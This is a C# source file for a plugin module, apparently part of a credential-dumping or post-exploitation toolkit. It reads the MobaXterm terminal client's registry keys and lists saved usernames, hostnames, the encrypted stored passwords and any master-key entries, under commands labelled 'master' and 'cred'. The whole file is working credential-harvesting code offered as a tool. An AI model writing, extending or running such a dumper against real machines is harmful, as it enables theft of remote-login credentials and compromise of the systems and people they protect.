using Microsoft.Win32;
using Plugin.Abstractions48;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Plugin48Dumper
{
    public class clsMobaXtermDumper : clsDumper
    {
        public DataTable dtHelp = new DataTable();

        public clsMobaXtermDumper()
        {
            Entry = "xterm";
            Description = "MobaXterm dumper";
            Usage = "<...> xterm <help|master|cred>";

            dtHelp.Columns.Add("Command");
            dtHelp.Columns.Add("Description");

            dtHelp.Rows.Add("help", "Show help.");
            dtHelp.Rows.Add("master", "Show master key if it has.");
            dtHelp.Rows.Add("cred", "Dump credentials.");

            Available = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm\\") != null;
        }

        public class clsCredential
        {
            public string Username { get; set; }
            public string Password { get; set; }
        }

        public class clsMasterKey
        {
            public string szHostname { get; set; }
            public string szEncPassword { get; set; }
        }

        public List<clsMasterKey> fnGetMasterKey(int nCount = 100, string szRegex = "")
        {
            List<clsMasterKey> ls = new List<clsMasterKey>();
            int n = 0;

            using (RegistryKey root = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm"))
            {
                using (RegistryKey subM = root.OpenSubKey("M"))
                {
                    if (subM == null)
                        throw new Exception($"Cannot find subkey: \"M\". No master key.");

                    foreach (string szSubKey in subM.GetValueNames())
                    {
                        string szHostname = szSubKey;
                        string szEncPassword = (string)subM.GetValue(szSubKey);

                        if (n >= nCount)
                            break;

                        if (Regex.IsMatch(szHostname, szRegex))
                        {
                            ls.Add(new clsMasterKey
                            {
                                szHostname = szHostname,
                                szEncPassword = szEncPassword,
                            });
                        }

                        n++;
                    }
                }
            }

            return ls;
        }

        public List<clsCredential> fnlsDump(int nCount = 100, string szRegex = "")
        {
            List<clsCredential> ls = new List<clsCredential>();
            int n = 0;

            using (RegistryKey root = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm"))
            {
                using (RegistryKey subP = root.OpenSubKey("P"))
                {
                    if (subP == null)
                        throw new Exception("Cannot find subkey: P");

                    foreach (string szSubKey in subP.GetValueNames())
                    {
                        string szUsername = szSubKey;
                        string szEncPassword = (string)subP.GetValue(szSubKey);

                        if (n >= nCount)
                            break;

                        if (Regex.IsMatch(szUsername, szRegex))
                        {
                            ls.Add(new clsCredential
                            {
                                Username = szSubKey,
                                Password = szEncPassword,
                            });
                        }

                        n++;
                    }
                }
            }

            return ls;
        }
    }
}
